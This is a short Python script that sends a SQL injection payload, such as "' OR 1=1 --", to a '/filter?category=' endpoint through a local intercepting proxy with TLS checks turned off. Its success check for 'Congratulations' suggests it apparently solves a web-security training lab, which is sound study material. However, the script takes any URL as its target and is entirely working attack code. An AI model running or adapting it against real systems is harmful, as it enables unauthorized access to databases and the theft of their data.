import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli(url, payload):
    uri = '/filter?category='
    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
    print(f"[DEBUG] Status Code: {r.status_code}")  # Debugging
    print(f"[DEBUG] Response Body: {r.text[:200]}")  # Debugging (first 200 characters)
    if "Congratulations" in r.text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print(" [-] Usage: %s <url> <payload>" % sys.argv[0])
        print("[-] Example: %s http://www.example.com \"' OR 1=1 --\" " % sys.argv[0])
        sys.exit(-1)

    if exploit_sqli(url, payload):
        print("[+] SQL injection successful")
    else:
        print("[-] SQL injection unsuccessful")
